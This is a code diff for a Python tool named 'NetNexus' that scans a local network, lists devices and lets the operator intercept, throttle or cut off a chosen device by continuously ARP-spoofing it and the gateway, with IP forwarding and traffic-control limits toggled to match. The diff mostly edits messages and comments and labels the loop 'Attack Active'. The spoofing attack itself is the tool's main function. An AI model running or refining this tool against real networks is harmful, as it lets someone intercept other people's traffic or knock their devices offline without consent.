@@ -10,10 +10,8 @@ def set_forwarding(state):
     subprocess.run(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True)
 
 def set_limit(interface, speed):
-    # Clear old rules first to avoid "File exists" errors
     subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
     try:
-        # Token Bucket Filter (tbf) for stable limiting
         subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                         "rate", speed, "latency", "50ms", "burst", "1540"], check=True)
         print(f"[*] Bandwidth limited to {speed}")
@@ -24,12 +22,13 @@ def clear_limit(interface):
     subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
 
 def main():
-    # Detect interface or use wlan0
+    print("[*] NetNexus Initializing...")
+    # Update this name to your actual interface (ip a)
     iface = "wlan0" 
     scapy.conf.iface = iface
     
     if os.geteuid() != 0:
-        print("[-] Please run with sudo.")
+        print("[-] Error: You must run this with sudo!")
         return
 
     gateway_ip = "192.168.8.1"
@@ -38,11 +37,15 @@ def main():
 
     while True:
         print("\n" + "="*45)
-        print("      NetNexus: Final Stable Build")
+        print("      NetNexus: Discovery & Control")
         print("="*45)
         
+        # Scan and update persistent memory
         device_memory = scanner.scan(ip_range, device_memory)
         current_list = list(device_memory.values())
+        
+        if not current_list:
+            print("[!] No devices found. Check your interface or network.")
         
         for index, dev in enumerate(current_list):
             print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
@@ -61,6 +64,7 @@ def main():
             print(f"\n[1] Intercept | [2] Limit | [3] Kill")
             mode = input("Select Action: ")
 
+            print("[*] Resolving Gateway...")
             gateway_mac, _ = spoof.get_device_info(gateway_ip)
 
             if mode == "1":
@@ -74,16 +78,20 @@ def main():
                 set_forwarding(False)
                 clear_limit(iface)
 
-            print(f"[*] Locked on {target_ip}. Intercepting...")
+            print(f"[*] Attack Active on {target_ip}. Ctrl+C to stop.")
             while True:
                 spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
-                time.sleep(0.5) # Balance between speed and CPU usage
+                time.sleep(0.5) 
                 
         except (ValueError, IndexError):
-            print("[-] Selection Error.")
+            print("[-] Invalid ID selected.")
         except KeyboardInterrupt:
-            print("\n[*] Cleaning up...")
+            print("\n[*] Stopping... Cleaning up settings.")
             set_forwarding(True)
             clear_limit(iface)
             spoof.restore(target_ip, gateway_ip)
             spoof.restore(gateway_ip, target_ip)
+            time.sleep(1)
+
+if __name__ == "__main__":
+    main()
